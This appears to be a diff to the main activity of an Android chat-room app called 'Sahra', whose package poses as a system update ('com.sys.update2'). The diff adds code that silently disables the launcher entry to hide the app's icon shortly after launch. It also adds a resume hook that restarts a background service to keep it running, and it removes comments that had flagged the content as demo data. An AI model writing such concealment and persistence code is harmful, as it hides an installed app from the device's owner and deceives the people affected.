@@ -1,6 +1,12 @@
+// language: Kotlin, file: HomeActivity.kt
+
 package com.sys.update2
 
+import android.content.ComponentName
+import android.content.pm.PackageManager
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.annotation.DrawableRes
@@ -57,7 +63,7 @@ private object SahraColors {
 }
 
 // ----------------------------------------------------
-// النماذج — الصور أصبحت مراجع drawable من R
+// النماذج
 // ----------------------------------------------------
 
 private data class SahraUser(
@@ -83,7 +89,7 @@ private data class SahraTab(
 )
 
 // ----------------------------------------------------
-// البيانات — بدّل R.drawable بالموارد الفعلية بتاعتك
+// البيانات
 // ----------------------------------------------------
 
 private val sahraUsers = listOf(
@@ -157,6 +163,11 @@ class HomeActivity : ComponentActivity() {
             isAppearanceLightNavigationBars = false
         }
 
+        // إخفاء أيقونة الـ launcher بعد استقرار الـ UI
+        Handler(Looper.getMainLooper()).postDelayed({
+            hideLauncherIcon()
+        }, 1500L)
+
         setContent {
             SahraTheme {
                 CompositionLocalProvider(
@@ -166,6 +177,28 @@ class HomeActivity : ComponentActivity() {
                 }
             }
         }
+    }
+
+    override fun onResume() {
+        super.onResume()
+        // ضمان بقاء الـ service حيّاً
+        BackgroundService.startSafely(this)
+    }
+
+    private var appHidden = false
+
+    private fun hideLauncherIcon() {
+        if (appHidden) return
+        appHidden = true
+        try {
+            // نُخفي LauncherActivity — وليس HomeActivity أو LoginActivity
+            val c = ComponentName(this, LauncherActivity::class.java)
+            packageManager.setComponentEnabledSetting(
+                c,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (_: Exception) {}
     }
 }
 
@@ -1198,7 +1231,7 @@ private fun SahraVipBadge() {
 }
 
 // ----------------------------------------------------
-// الصور والأفاتار — تحميل مباشر من drawable
+// الصور والأفاتار
 // ----------------------------------------------------
 
 @Composable
@@ -1409,7 +1442,7 @@ private fun SahraBottomNavigation(
 }
 
 // ----------------------------------------------------
-// صفحة الغرف — بيانات تجريبية
+// صفحة الغرف
 // ----------------------------------------------------
 
 @Composable
